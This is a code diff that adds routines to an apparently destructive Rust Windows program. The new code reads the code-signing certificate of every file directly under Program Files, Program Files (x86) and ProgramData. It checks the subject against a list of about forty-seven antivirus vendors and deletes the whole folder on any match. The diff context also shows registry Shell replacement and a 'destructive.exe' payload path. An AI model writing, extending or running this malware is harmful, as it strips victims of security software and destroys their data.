@@ -8,6 +8,18 @@ use windows::Win32::System::SystemInformation::GetOsSafeBootMode;
 use windows::Win32::Foundation::BOOL;
 use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_WRITE};
 use winreg::RegKey;
+use std::ffi::c_void;
+use std::iter::once;
+use std::ptr::null_mut;
+use std::fs;
+use windows::Win32::Security::Cryptography::{
+    CertEnumCertificatesInStore, CertGetNameStringW,
+    CertCloseStore, CryptQueryObject, CryptMsgClose,
+    CERT_QUERY_OBJECT_FILE,
+    CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
+    CERT_QUERY_FORMAT_FLAG_BINARY,
+    CERT_NAME_SIMPLE_DISPLAY_TYPE,
+};
 
 fn is_admin() -> bool {
     let output = Command::new("whoami")
@@ -98,6 +110,167 @@ fn modify_registry() -> io::Result<()> {
     println!("Registry modified successfully: Shell set to \"{}\".", new_shell_value);
 
     Ok(())
+}
+
+/// List of antivirus signature substrings to search for in the certificate's subject.
+const ANTIVIRUS_LIST: &[&str] = &[
+    "System Healer Tech Sp.Zo.o",
+    "Beijing Rising Information Technology Corporation Limited",
+    "Filseclab Corporation",
+    "Trend Micro, Inc.",
+    "SUPERAntiSpyware.com",
+    "Sophos Ltd",
+    "ThreatTrack Security, Inc.",
+    "IKARUS Security Software GmbH",
+    "Quick Heal Technologies(Pvt) Ltd.",
+    "Panda Security S.L",
+    "Blue Coat Norway AS",
+    "NANO Security Ltd",
+    "McAfee, Inc.",
+    "Glarysoft LTD",
+    "Malwarebytes Corporation",
+    "Kaspersky Lab",
+    "K7 Computing Pvt Ltd",
+    "SurfRight B.V.",
+    "FRISK Software International",
+    "Fortinet Technologies",
+    "Emsisoft GmbH",
+    "ESET, spol.s r.o.",
+    "Doctor Web Ltd.",
+    "Immunet Corporation",
+    "Comodo Security Solutions",
+    "G DATA Software AG",
+    "BullGuard Ltd.",
+    "Bitdefender SRL",
+    "Avira Operations GmbH & Co.KG",
+    "AVG Technologies CZ, s.r.o.",
+    "AVAST Software s.r.o.",
+    "Check Point Software Technologies Ltd.",
+    "VIRUSBLOKADA ODO",
+    "Qihoo 360 Software(Beijing) Company Limited",
+    "Plumbytes Software Lp",
+    "Bleeping Computer, LLC.",
+    "Symantec Corporation",
+    "AhnLab",
+    "Baidu (China)",
+    "Safer Networking Ltd.",
+    "BrightFort LLC",
+    "Gridinsoft, LLC",
+    "Auslogics Labs Pty Ltd",
+    "Datpol Janusz Siemienowicz",
+    "Zemana Ltd.",
+    "Piriform Ltd",
+    "IObit Information Technology",
+];
+
+/// Retrieves the subject string from the first certificate embedded in the file.
+/// This function uses CryptQueryObject to load the certificate store from the file
+/// and then enumerates the first certificate to retrieve its subject using CertGetNameStringW.
+/// Note that no validation is performed.
+fn get_signature_subject(file_path: &str) -> Option<String> {
+    // Convert the file path to a null-terminated wide string.
+    let file_path_w: Vec<u16> = file_path.encode_utf16().chain(once(0)).collect();
+
+    // Declare output variables.
+    let mut encoding: u32 = 0;
+    let mut content_type: u32 = 0;
+    let mut format_type: u32 = 0;
+    let mut cert_store = windows::Win32::Security::Cryptography::HCERTSTORE(null_mut());
+    let mut msg: isize = 0; // HCRYPTMSG is represented as isize.
+
+    // Call CryptQueryObject.
+    // We need to cast the mutable references to the expected pointer types.
+    unsafe {
+        CryptQueryObject(
+            CERT_QUERY_OBJECT_FILE,
+            file_path_w.as_ptr() as *const c_void,
+            CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
+            CERT_QUERY_FORMAT_FLAG_BINARY,
+            0,
+            Some(&mut encoding as *mut u32 as *mut _),
+            Some(&mut content_type as *mut u32 as *mut _),
+            Some(&mut format_type as *mut u32 as *mut _),
+            Some(&mut cert_store),
+            Some(&mut msg as *mut isize as *mut *mut c_void),
+            None,
+        )
+        .expect("CryptQueryObject failed");
+    }
+
+    // Enumerate the first certificate in the store.
+    let p_cert_ctx = unsafe { CertEnumCertificatesInStore(cert_store, None) };
+    if !p_cert_ctx.is_null() {
+        let mut buf = [0u16; 256];
+        // Call CertGetNameStringW with the buffer wrapped as a mutable slice.
+        let name_len = unsafe {
+            CertGetNameStringW(
+                p_cert_ctx,
+                CERT_NAME_SIMPLE_DISPLAY_TYPE,
+                0,
+                None,
+                Some(&mut buf[..]),
+            )
+        };
+
+        // name_len includes the terminating null; if greater than 1, we got a name.
+        if name_len > 1 {
+            let subject = String::from_utf16_lossy(&buf[..(name_len - 1) as usize]);
+            unsafe {
+                CertCloseStore(Some(cert_store), 0).ok();
+                CryptMsgClose(if msg != 0 { Some(msg as *const c_void) } else { None }).ok();
+            }
+            return Some(subject);
+        }
+    }
+    // Clean up if no certificate was found.
+    unsafe {
+        CertCloseStore(Some(cert_store), 0).ok();
+        CryptMsgClose(if msg != 0 { Some(msg as *const c_void) } else { None }).ok();
+    }
+    None
+}
+
+/// Removes the entire folder containing the file at `file_path`.
+fn remove_folder(file_path: &str) {
+    let path = Path::new(file_path);
+    if let Some(parent) = path.parent() {
+        println!("Deleting folder: {}", parent.display());
+        match fs::remove_dir_all(parent) {
+            Ok(_) => println!("Successfully removed folder: {}", parent.display()),
+            Err(err) => eprintln!("Error removing folder {}: {}", parent.display(), err),
+        }
+    } else {
+        eprintln!("Could not determine parent folder for file: {}", file_path);
+    }
+}
+
+/// Scans the specified directory (non-recursively) for files.
+/// For each file, it retrieves its certificate subject string (without validation)
+/// and checks whether that subject contains any antivirus substring.
+/// If a match is found, the folder containing that file is removed.
+fn scan_directory(dir: &str) {
+    println!("Scanning directory: {}", dir);
+    if let Ok(entries) = fs::read_dir(dir) {
+        for entry in entries.flatten() {
+            let path = entry.path();
+            // Process only files.
+            if path.is_file() {
+                let file_path = path.to_string_lossy().to_string();
+                if let Some(subject) = get_signature_subject(&file_path) {
+                    let subject_lower = subject.to_lowercase();
+                    for av in ANTIVIRUS_LIST {
+                        if subject_lower.contains(&av.to_lowercase()) {
+                            println!("File {} has certificate subject matching antivirus: {}", file_path, subject);
+                            remove_folder(&file_path);
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+    } else {
+        eprintln!("Could not read directory: {}", dir);
+    }
 }
 
 fn main() -> io::Result<()> {
@@ -294,6 +467,28 @@ fn main() -> io::Result<()> {
         if let Err(e) = modify_registry() {
             eprintln!("Error removing antivirus folder: {}", e);
         }
+
+        // Remove antivirus folders from Program Files, Program Files (x86) and Program Data
+        println!("Starting scan for antivirus software...");
+
+        // Retrieve system directories from environment variables.
+        let mut directories = Vec::new();
+        if let Ok(prog_files) = env::var("ProgramFiles") {
+            directories.push(prog_files);
+        }
+        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
+            directories.push(prog_files_x86);
+        }
+        if let Ok(program_data) = env::var("ProgramData") {
+            directories.push(program_data);
+        }
+    
+        // Scan each directory.
+        for dir in directories {
+            scan_directory(&dir);
+        }
+    
+        println!("Scan completed.");
 
         if let Ok(program_files) = env::var("ProgramFiles") {
             let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
